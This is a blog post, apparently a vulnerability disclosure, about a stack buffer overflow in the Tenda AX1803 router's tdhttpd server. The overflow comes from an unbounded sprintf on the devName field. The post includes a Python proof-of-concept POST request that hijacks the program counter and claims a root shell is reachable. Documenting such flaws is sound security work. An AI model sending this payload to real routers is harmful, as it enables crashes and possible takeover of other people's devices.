=== Content from www.cnblogs.com_7ff1669f_20250111_153835.html ===


[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241223074306759-703982459.jpg)](https://www.marscode.cn/?utm_source=advertising&utm_medium=cnblogs.com_ug_cpa&utm_term=hw_marscode_cnblogs&utm_content=home)
[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201073014811-1847930772.jpg)](https://www.doubao.com?channel=cnblogs&source=hw_db_cnblogs)

* [![博客园Logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [周边](https://cnblogs.vip/store)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/18341478)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)
  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)
  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  简洁模式 ![](/images/lite-mode-check.svg)...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[FALL3N](https://www.cnblogs.com/FALL3N)

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/FALL3N/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/XFALLEN)
* 订阅
* [管理](https://i.cnblogs.com/)

# [Tenda AX1803 Buffer Overflow vulnerability .](https://www.cnblogs.com/FALL3N/p/16813932.html "发布于 2022-10-23 00:39")

# stack buffer overflow in tdhttpd in Tenda AX1803 1.0.0.1\_2994 and earlier allows remote authenticated users to remote code excution via SetOnlineDevName request

## Overview

**type**: Buffer Overflow vulnerability

**Manufacturer** : Tenda( (<https://www.tenda.com.cn/>)

**Product**: WiFi router ax1803

**Firmware download address** ： <https://www.tenda.com.cn/download/detail-3421.html>

**Product Information**:Tendaax1803 router adopts WiFi 6 (802.11ax) technology, and the dual band concurrency rate is up to 1775mbps (2.4ghz:574mbps, 5ghz:1201mbps). Compared with the ac1200 router of the previous generation WiFi 5 standard, the wireless rate is increased by 50% and the transmission distance is longer; Equipped with 1.5GHz high-performance quad core processor, the network load capacity is comprehensively improved, data forwarding is faster, and long-term operation is more stable; Using ofdma+mu-mimo technology, more devices can access the Internet at the same time, the transmission efficiency is significantly improved, the delay is significantly reduced, and the online games and ultra clear videos for multiple people are more fluent. It is the first choice for building a multimedia home network!

Overview of the latest version router simulation of Tenda AX1803 v1.0.0.1\_2994

![image](https://img2022.cnblogs.com/blog/2293519/202210/2293519-20221021113807278-1711302823.png)

## Vulnerablity details

Download the firmware and decompress it, use `Binwalk -e` to extract filesystem

![image](https://img2022.cnblogs.com/blog/2293519/202211/2293519-20221117174859217-1136855955.png)

The vulnerability lies in rootfs\_In /goform/SetOnlineDevName function of /bin/tdhttpd in ubif file system. attackers can access <http://routerip/goform/SetOnlineDevName> , and setting a very long DevName parameter to trigger stack buffer overlow, the stack buffer overflow can be caused to achieve the effect of router remote code excution and can obtain a stable root shell through a carefully constructed payload

Request can be found in this place:

![image](https://img2022.cnblogs.com/blog/2293519/202211/2293519-20221117181314113-1666657356.png)

As we can see devName section in POST request.

![image](https://img2022.cnblogs.com/blog/2293519/202211/2293519-20221117181404131-1515326615.png)

`formSetDeviceName` function (/bin/tdhttpd) call a function to bond device name with mac information, this function is vulnerable to buffer overflow.

![image](https://img2022.cnblogs.com/blog/2293519/202210/2293519-20221021113616735-352041590.png)

In the `"set_name_with_mac"` function, `devName` is copied into `v9` array through `sprintf` function with format arg `"%s;1"`, this means sprintf would copie all the content in devName and there is no length limitation for devName.

The `v9` array is defined in here. The length of array is 256 bytes, if the `devName's` length longer than `v9` would cause buffer overflow

![image](https://img2022.cnblogs.com/blog/2293519/202210/2293519-20221021141415215-1750127175.png)

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
#!/usr/bin/env python3
import requests,sys
from pwn import *

# replace ip address here
url = "http://192.168.10.1/goform/SetOnlineDevName"
payload = 'a' * 0x100

payload = "mac=00:00:00:00:00:01&devName=%s&nodeName=mainNode"%payload
content_length = len(payload)
header = {
"Host":"192.168.10.1",
"X-Requested-With":"XMLHttpRequest",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
"Origin":"http://192.168.10.1",
"Content-Length":"%d"%content_length,
"Connection": "close",
"Cookie": "password=bcf33de30ebf57e4d3785c08adec4b85cvztgb" # Note to replace the password field in the cookie
}

r = requests.post(url, headers=header, data=payload)

```

**result:**

As you can see below, PC register is hijacked with payload. By constructing a payload, this can also get a stable root shell

![](https://img2022.cnblogs.com/blog/2293519/202210/2293519-20221023003139409-1003085835.png)

posted @
2022-10-23 00:39
[XFALLEN](https://www.cnblogs.com/FALL3N)
阅读(377)
评论(0)
[编辑](https://i.cnblogs.com/EditPosts.aspx?postid=16813932)
收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202412/35695-20241201072501456-2052907165.jpg)](https://www.doubao.com?channel=cnblogs&source=hw_db_cnblogs)

### 公告

Copyright © 2025 XFALLEN


